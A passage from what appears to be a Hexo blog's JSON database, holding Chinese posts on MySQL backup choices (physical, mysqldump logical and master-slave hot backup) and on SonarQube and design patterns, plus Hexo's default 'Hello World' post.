&#x673A;&#x5668;&#xFF08;&#x6216;&#x8005;&#x76F8;&#x53CD;&#xFF09;&#x662F;&#x884C;&#x4E0D;&#x901A;&#x7684;&#x3002;&#x7531;MySQL3.23 &#x5F15;&#x8FDB;&#x7684;MyISAM &#x8868;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x4E3A;&#x8BE5;&#x683C;&#x5F0F;&#x4E0E;&#x673A;&#x5668;&#x72EC;&#x7ACB;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5982;&#x679C;&#x4EE5;&#x4E0B;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x90FD;&#x6EE1;&#x8DB3;&#x7684;&#x8BDD;&#xFF0C;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x79FB;&#x690D;&#x5230;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x786C;&#x4EF6;&#x7ED3;&#x6784;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF1A;&#x5373;&#x53E6;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x4E5F;&#x5FC5;&#x987B;&#x8FD0;&#x884C;MySQL3.23 &#x4EE5;&#x4E0A;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5E76;&#x4E14;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x8868;&#x793A;&#x6210;MyISAM &#x8868;&#xFF0C;&#x800C;&#x4E0D;&#x662F;ISAM &#x8868;&#x3002;</p>\n<h3 id=\"&#x903B;&#x8F91;&#x5907;&#x4EFD;\"><a href=\"#&#x903B;&#x8F91;&#x5907;&#x4EFD;\" class=\"headerlink\" title=\"&#x903B;&#x8F91;&#x5907;&#x4EFD;\"></a>&#x903B;&#x8F91;&#x5907;&#x4EFD;</h3><p>&#x4F7F;&#x7528;mysql&#x81EA;&#x5E26;&#x7684;mysqldump&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x3002;&#x5907;&#x4EFD;&#x6210;sql&#x6587;&#x4EF6;&#x5F62;&#x5F0F;&#x3002;<br>&#x4F18;&#x70B9;&#xFF1A;&#x6700;&#x5927;&#x597D;&#x5904;&#x662F;&#x80FD;&#x591F;&#x4E0E;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;mysql&#x81EA;&#x52A8;&#x534F;&#x540C;&#x5DE5;&#x4F5C;&#xFF0C;<br>&#x5728;&#x8FD0;&#x884C;&#x671F;&#x95F4;&#x53EF;&#x4EE5;&#x786E;&#x4FDD;&#x5907;&#x4EFD;&#x662F;&#x5F53;&#x65F6;&#x7684;&#x70B9;&#xFF0C;&#x5B83;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x5BF9;&#x5E94;&#x64CD;&#x4F5C;&#x7684;&#x8868;&#x9501;&#x5B9A;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x4FEE;&#x6539;(&#x53EA;&#x80FD;&#x8BBF;&#x95EE;)&#x3002;&#x53EF;&#x80FD;&#x4F1A;&#x963B;&#x6B62;&#x4FEE;&#x6539;&#x64CD;&#x4F5C;&#x3002;sql&#x6587;&#x4EF6;&#x901A;&#x7528;&#x65B9;&#x4FBF;&#x79FB;&#x690D;&#x3002;</p>\n<p>&#x7F3A;&#x70B9;&#xFF1A;&#x5907;&#x4EFD;&#x7684;&#x901F;&#x5EA6;&#x6BD4;&#x8F83;&#x6162;&#x3002;&#x5982;&#x679C;&#x662F;&#x6570;&#x636E;&#x91CF;&#x5F88;&#x591A;&#x7684;&#x65F6;&#x5019;&#x3002;&#x5C31;&#x5F88;&#x8017;&#x65F6;&#x95F4;&#x3002;&#x5982;&#x679C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5904;&#x5728;&#x63D0;&#x4F9B;&#x7ED9;&#x7528;&#x6237;&#x670D;&#x52A1;&#x72B6;&#x6001;&#xFF0C;&#x5728;&#x8FD9;&#x6BB5;&#x957F;&#x65F6;&#x95F4;&#x64CD;&#x4F5C;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x8981;&#x9501;&#x5B9A;&#x8868;(&#x4E00;&#x822C;&#x662F;&#x8BFB;&#x9501;&#x5B9A;&#xFF0C;&#x53EA;&#x80FD;&#x8BFB;&#x4E0D;&#x80FD;&#x5199;&#x5165;&#x6570;&#x636E;)&#x3002;&#x90A3;&#x4E48;&#x670D;&#x52A1;&#x5C31;&#x4F1A;&#x5F71;&#x54CD;&#x7684;&#x3002;</p>\n<p>&#x5907;&#x6CE8;&#xFF1A;&#x6240;&#x8C13;&#x7684;&#x4E0E;mysql&#x670D;&#x52A1;&#x5668;&#x80FD;&#x591F;&#x81EA;&#x52A8;&#x534F;&#x540C;&#x5DE5;&#x4F5C;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x6307;&#x52A0;&#x53C2;&#x6570;&#x6765;&#x63A7;&#x5236;mysql&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6BD4;&#x5982;&#x9501;&#x5B9A;&#x6240;&#x6709;&#x8868;&#x53EA;&#x80FD;&#x8FDB;&#x884C;&#x8BFB;&#xFF0C;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#x3002;</p>\n<p>&#x2013;lock-all-tables</p>\n<h3 id=\"&#x53CC;&#x673A;&#x70ED;&#x5907;&#x4EFD;\"><a href=\"#&#x53CC;&#x673A;&#x70ED;&#x5907;&#x4EFD;\" class=\"headerlink\" title=\"&#x53CC;&#x673A;&#x70ED;&#x5907;&#x4EFD;\"></a>&#x53CC;&#x673A;&#x70ED;&#x5907;&#x4EFD;</h3><p>mysql&#x6570;&#x636E;&#x5E93;&#x6CA1;&#x6709;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x673A;&#x5236;&#x3002;&#x5F53;&#x6570;&#x636E;&#x91CF;&#x592A;&#x5927;&#x7684;&#x65F6;&#x5019;&#x5907;&#x4EFD;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5927;&#x7684;&#x95EE;&#x9898;&#x3002;&#x8FD8;&#x597D;mysql&#x6570;&#x636E;&#x5E93;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x79CD;&#x4E3B;&#x4ECE;&#x5907;&#x4EFD;&#x7684;&#x673A;&#x5236;(&#x4E5F;&#x5C31;&#x662F;&#x53CC;&#x673A;&#x70ED;&#x5907;)<br>&#x4F18;&#x70B9;&#xFF1A;&#x9002;&#x5408;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x65F6;&#x5019;&#x3002;&#x73B0;&#x5728;&#x660E;&#x767D;&#x4E86;&#x3002;&#x5927;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#x5BF9;&#x4E8E;mysql&#x6570;&#x636E;&#x5907;&#x4EFD;&#xFF0C;&#x90FD;&#x662F;&#x91C7;&#x7528;&#x70ED;&#x673A;&#x5907;&#x4EFD;&#x3002;&#x642D;&#x5EFA;&#x591A;&#x53F0;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FDB;&#x884C;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x3002;</p>\n<p>&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x7ECF;&#x5E38;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x662F;&#xFF0C;&#x5982;&#x4F55;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x4E0D;&#x5835;&#x585E;&#xFF0C;&#x4E0D;&#x5EF6;&#x8FDF;&#x3002;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x5BB9;&#x5FCD;&#x7684;&#xFF0C;&#x6709;&#x4E00;&#x4E9B;&#x65B9;&#x6848;&#x53EF;&#x4EE5;&#x6539;&#x5584;&#x3002;&#x6BD5;&#x7ADF;&#x6709;&#x5F97;&#x6709;&#x5931;&#x7684;&#x3002;&#x8FD9;&#x5DF2;&#x7ECF;&#x662F;&#x5F88;&#x7701;&#x5FC3;&#x7701;&#x529B;&#x7684;&#x65B9;&#x5F0F;&#x4E86;&#x3002;</p>\n<p>================================================</p>\n<p>&#x6211;&#x76EE;&#x524D;&#x5E94;&#x8BE5;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x5907;&#x4EFD;&#x7B56;&#x7565;&#x7684;&#x6743;&#x8861;&#xFF1A;</p>\n<p>&#x7269;&#x7406;&#x5907;&#x4EFD;&#xFF0C;&#x6062;&#x590D;&#x5FEB;&#xFF0C;&#x5F53;&#x7136;&#x6700;&#x597D;&#x662F;&#x5B58;&#x50A8;&#x5728;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x4E0A;&#x3002;&#x6211;&#x73B0;&#x5728;&#x662F;&#x7528;&#x7269;&#x7406;&#x5907;&#x4EFD;&#x8FD8;&#x662F;&#x903B;&#x8F91;&#x5907;&#x4EFD;&#x4E3A;&#x597D;&#x5462;&#xFF1F;<br>&#x8003;&#x8651;&#x5230;&#x4EE5;&#x540E;&#x4F1A;&#x8FC1;&#x79FB;&#x5E73;&#x53F0;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x901A;&#x7528;&#x6027;&#x3002;&#x6062;&#x590D;&#x901F;&#x5EA6;1&#x5206;&#x949F;&#x5DE6;&#x53F3;&#x7684;&#x5DEE;&#x8DDD;&#x6211;&#x662F;&#x53EF;&#x4EE5;&#x5BB9;&#x5FCD;&#x7684;(sql&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x65B9;&#x5F0F;&#xFF0C;&#x6062;&#x590D;&#x901F;&#x5EA6;&#x6CA1;&#x6709;&#x7269;&#x7406;&#x914D;&#x5907;&#x5FEB;&#xFF0C;&#x7269;&#x7406;&#x5907;&#x4EFD;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x8986;&#x76D6;&#x6389;&#x539F;&#x6765;&#x6587;&#x4EF6;&#x5373;&#x53EF;)&#x3002;&#x6240;&#x4EE5;&#x6211;&#x4E3A;&#x4E86;&#x8DE8;&#x5E73;&#x53F0;&#xFF0C;&#x6211;&#x66F4;&#x52A0;&#x613F;&#x610F;&#x4F7F;&#x7528;&#x903B;&#x8F91;&#x5907;&#x4EFD;&#x3002;&#x5B58;&#x50A8;sql&#x6587;&#x4EF6;&#x5F62;&#x5F0F;&#x3002;</p>\n<p>&#x53CC;&#x70ED;&#x673A;&#x5907;&#x4EFD;&#x65B9;&#x5F0F;&#xFF0C;&#x76EE;&#x524D;&#x786C;&#x4EF6;&#x6CA1;&#x6709;&#x591A;&#x4E2A;&#x3002;&#x6280;&#x672F;&#x4EBA;&#x5458;&#x6709;&#x9650;&#xFF0C;&#x9700;&#x8981;&#x4EBA;&#x529B;&#x53BB;&#x7EF4;&#x62A4;&#xFF0C;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#x3002;&#x6240;&#x4EE5;&#x6392;&#x9664;&#x5728;&#x5916;&#x3002;</p>\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","source":"_drafts/hello-worlda.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","slug":"hello-worlda","published":0,"date":"2016-11-18T06:53:47.945Z","updated":"2016-11-18T06:50:52.216Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulf8005hgwtmle8qusfg","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"external\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"external\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"external\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"external\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"external\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"external\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"external\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"external\">Deployment</a></p>\n","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\">Deployment</a></p>\n"},{"title":"从SonarQube谈设计模式","date":"2016-06-05T13:42:13.000Z","_content":"\n\n#### SonarQube\nSonarQube是用来检测代码质量的，但类似工具的推广常常遇到阻碍。\n\n\n成型项目或僵尸项目可以理解，项目优化需要投入的人力成本和时间成本太大，而且最主要的是无法保证改动过程中不引入新的bug。那么大家会想，在项目立项初期配合使用，这应该没什么问题了吧？奈何理由这东西，只要想找，总是有的。毕竟大家都喜欢待在舒适区，不喜欢折腾。试想刚提交完代码没多久，邮件就提醒你需要优化，打开一看，原来又是for循环太多、嵌套太多、重复代码太多或者方法行数太多。why？我实现功能不就行了吗？时间这么紧迫，怎么有时间修改这种问题呢？连这些小问题都抓住不放？呵呵，以后有时间一定改。\n\n\n我起初也这么想的，虽然知道好的习惯养成很重要，但还是避免不了有所抵触。不过好在上头规定相关类型bug必须清零，坚持的时间一长，收获还是蛮大，最直接的体现就是代码易读性加强了。这个时候我突然就想起了设计模式。\n\n\n#### 设计模式\n自大二接触Java以来，就知道IT界有一种无上功法叫设计模式，然后就一直想着哪天能融会贯通，挥手间，就是一片锦绣代码。\n<!-- more -->\n可是这些年过去，设计模式给我的感觉就是遥不可及，仿佛它只存在于面试题中，而且奇怪的是大家闲时谈论技术也很少涉及，why? 首先自我反思，那是自身水平不行，get不到核心，但我相信这不是全部原因。\n\n我认为设计模式的出现是为了更好的写好代码，它只是手段，不是目的。奈何这系列手段太高明，完全不是初级菜鸟的菜。初级菜鸟没掌握，那大神级别的平常为什么也不怎么谈论设计模式呢？我想，可能是因为不同层级的人，如果用设计模式里面的逼格名词谈论，根本就无法沟通，因为我们平常是这么讨论的：\n\n- 这个类负责创建这个对象，对。然后这边包装一下，对的。\n- 嗯，你这个类就是针对他的Interface做的一个Adapter，是的。\n- 你这个只创建一次，提高性能。哦，对，没错，但这样更好，balabala...\n\n\n所以设计模式大部分情况下只是给大家提供了一条快速提升逼格的途径，要是没有时间上的积累，就算把所有设计模式的名字都背下来，可能还是不太会用 0.0\n\n\n#### SonarQube & 设计模式\n\n那么怎么才能优雅的掌握设计模式呐，想来想去，我的方法是先了解它，知道它的存在，然后忽略它，最后在任何情况下，都努力自己去提高代码的阅读性。当你想尽一切办法去控制你的代码量、减少嵌套与循环、减少潜在风险时，我想时间长了，无师自通，自有一番风景。\n\n![重构原则](1.png)","source":"_drafts/从SonarQube谈设计模式.md","raw":"---\ntitle: 从SonarQube谈设计模式\ntags:\n  - SonarQube\n  - 设计模式\ncategories:\n  - 相关感悟\n\ndate: 2016-6-5 21:42:13\n---\n\n\n#### SonarQube\nSonarQube是用来检测代码质量的，但类似工具的推广常常遇到阻碍。\n\n\n成型项目或僵尸项目可以理解，项目优化需要投入的人力成本和时间成本太大，而且最主要的是无法保证改动过程中不引入新的bug。那么大家会想，在项目立项初期配合使用，这应该没什么问题了吧？奈何理由这东西，只要想找，总是有的。毕竟大家都喜欢待在舒适区，不喜欢折腾。试想刚提交完代码没多久，邮件就提醒你需要优化，打开一看，原来又是for循环太多、嵌套太多、重复代码太多或者方法行数太多。why？我实现功能不就行了吗？时间这么紧迫，怎么有时间修改这种问题呢？连这些小问题都抓住不放？呵呵，以后有时间一定改。\n\n\n我起初也这么想的，虽然知道好的习惯养成很重要，但还是避免不了有所抵触。不过好在上头规定相关类型bug必须清零，坚持的时间一长，收获还是蛮大，最直接的体现就是代码易读性加强了。这个时候我突然就想起了设计模式。\n\n\n#### 设计模式\n自大二接触Java以来，就知道IT界有一种无上功法叫设计模式，然后就一直想着哪天能融会贯通，挥手间，就是一片锦绣代码。\n<!-- more -->\n可是这些年过去，设计模式给我的感觉就是遥不可及，仿佛它只存在于面试题中，而且奇怪的是大家闲时谈论技术也很少涉及，why? 首先自我反思，那是自身水平不行，get不到核心，但我相信这不是全部原因。\n\n我认为设计模式的出现是为了更好的写好代码，它只是手段，不是目的。奈何这系列手段太高明，完全不是初级菜鸟的菜。初级菜鸟没掌握，那大神级别的平常为什么也不怎么谈论设计模式呢？我想，可能是因为不同层级的人，如果用设计模式里面的逼格名词谈论，根本就无法沟通，因为我们平常是这么讨论的：\n\n- 这个类负责创建这个对象，对。然后这边包装一下，对的。\n- 嗯，你这个类就是针对他的Interface做的一个Adapter，是的。\n- 你这个只创建一次，提高性能。哦，对，没错，但这样更好，balabala...\n\n\n所以设计模式大部分情况下只是给大家提供了一条快速提升逼格的途径，要是没有时间上的积累，就算把所有设计模式的名字都背下来，可能还是不太会用 0.0\n\n\n#### SonarQube & 设计模式\n\n那么怎么才能优雅的掌握设计模式呐，想来想去，我的方法是先了解它，知道它的存在，然后忽略它，最后在任何情况下，都努力自己去提高代码的阅读性。当你想尽一切办法去控制你的代码量、减少嵌套与循环、减少潜在风险时，我想时间长了，无师自通，自有一番风景。\n\n![重构原则](1.png)","slug":"从SonarQube谈设计模式","published":0,"updated":"2016-11-18T06:50:52.218Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulfb005lgwtm544mo75l","content":"<h4 id=\"SonarQube\"><a href=\"#SonarQube\" class=\"headerlink\" title=\"SonarQube\"></a>SonarQube</h4><p>SonarQube&#x662F;&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x7684;&#xFF0C;&#x4F46;&#x7C7B;&#x4F3C;&#x5DE5;&#x5177;&#x7684;&#x63A8;&#x5E7F;&#x5E38;&#x5E38;&#x9047;&#x5230;&#x963B;&#x788D;&#x3002;</p>\n<p>&#x6210;&#x578B;&#x9879;&#x76EE;&#x6216;&#x50F5;&#x5C38;&#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#xFF0C;&#x9879;&#x76EE;&#x4F18;&#x5316;&#x9700;&#x8981;&#x6295;&#x5165;&#x7684;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x548C;&#x65F6;&#x95F4;&#x6210;&#x672C;&#x592A;&#x5927;&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x662F;&#x65E0;&#x6CD5;&#x4FDD;&#x8BC1;&#x6539;&#x52A8;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x5F15;&#x5165;&#x65B0;&#x7684;bug&#x3002;&#x90A3;&#x4E48;&#x5927;&#x5BB6;&#x4F1A;&#x60F3;&#xFF0C;&#x5728;&#x9879;&#x76EE;&#x7ACB;&#x9879;&#x521D;&#x671F;&#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x5E94;&#x8BE5;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x4E86;&#x5427;&#xFF1F;&#x5948;&#x4F55;&#x7406;&#x7531;&#x8FD9;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x8981;&#x60F3;&#x627E;&#xFF0C;&#x603B;&#x662F;&#x6709;&#x7684;&#x3002;&#x6BD5;&#x7ADF;&#x5927;&#x5BB6;&#x90FD;&#x559C;&#x6B22;&#x5F85;&#x5728;&#x8212;&#x9002;&#x533A;&#xFF0C;&#x4E0D;&#x559C;&#x6B22;&#x6298;&#x817E;&#x3002;&#x8BD5;&#x60F3;&#x521A;&#x63D0;&#x4EA4;&#x5B8C;&#x4EE3;&#x7801;&#x6CA1;&#x591A;&#x4E45;&#xFF0C;&#x90AE;&#x4EF6;&#x5C31;&#x63D0;&#x9192;&#x4F60;&#x9700;&#x8981;&#x4F18;&#x5316;&#xFF0C;&#x6253;&#x5F00;&#x4E00;&#x770B;&#xFF0C;&#x539F;&#x6765;&#x53C8;&#x662F;for&#x5FAA;&#x73AF;&#x592A;&#x591A;&#x3001;&#x5D4C;&#x5957;&#x592A;&#x591A;&#x3001;&#x91CD;&#x590D;&#x4EE3;&#x7801;&#x592A;&#x591A;&#x6216;&#x8005;&#x65B9;&#x6CD5;&#x884C;&#x6570;&#x592A;&#x591A;&#x3002;why&#xFF1F;&#x6211;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x4E0D;&#x5C31;&#x884C;&#x4E86;&#x5417;&#xFF1F;&#x65F6;&#x95F4;&#x8FD9;&#x4E48;&#x7D27;&#x8FEB;&#xFF0C;&#x600E;&#x4E48;&#x6709;&#x65F6;&#x95F4;&#x4FEE;&#x6539;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x8FDE;&#x8FD9;&#x4E9B;&#x5C0F;&#x95EE;&#x9898;&#x90FD;&#x6293;&#x4F4F;&#x4E0D;&#x653E;&#xFF1F;&#x5475;&#x5475;&#xFF0C;&#x4EE5;&#x540E;&#x6709;&#x65F6;&#x95F4;&#x4E00;&#x5B9A;&#x6539;&#x3002;</p>\n<p>&#x6211;&#x8D77;&#x521D;&#x4E5F;&#x8FD9;&#x4E48;&#x60F3;&#x7684;&#xFF0C;&#x867D;&#x7136;&#x77E5;&#x9053;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x517B;&#x6210;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x907F;&#x514D;&#x4E0D;&#x4E86;&#x6709;&#x6240;&#x62B5;&#x89E6;&#x3002;&#x4E0D;&#x8FC7;&#x597D;&#x5728;&#x4E0A;&#x5934;&#x89C4;&#x5B9A;&#x76F8;&#x5173;&#x7C7B;&#x578B;bug&#x5FC5;&#x987B;&#x6E05;&#x96F6;&#xFF0C;&#x575A;&#x6301;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x957F;&#xFF0C;&#x6536;&#x83B7;&#x8FD8;&#x662F;&#x86EE;&#x5927;&#xFF0C;&#x6700;&#x76F4;&#x63A5;&#x7684;&#x4F53;&#x73B0;&#x5C31;&#x662F;&#x4EE3;&#x7801;&#x6613;&#x8BFB;&#x6027;&#x52A0;&#x5F3A;&#x4E86;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x7A81;&#x7136;&#x5C31;&#x60F3;&#x8D77;&#x4E86;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x3002;</p>\n<h4 id=\"&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"><a href=\"#&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"></a>&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;</h4><p>&#x81EA;&#x5927;&#x4E8C;&#x63A5;&#x89E6;Java&#x4EE5;&#x6765;&#xFF0C;&#x5C31;&#x77E5;&#x9053;IT&#x754C;&#x6709;&#x4E00;&#x79CD;&#x65E0;&#x4E0A;&#x529F;&#x6CD5;&#x53EB;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x7740;&#x54EA;&#x5929;&#x80FD;&#x878D;&#x4F1A;&#x8D2F;&#x901A;&#xFF0C;&#x6325;&#x624B;&#x95F4;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x7247;&#x9526;&#x7EE3;&#x4EE3;&#x7801;&#x3002;<br><a 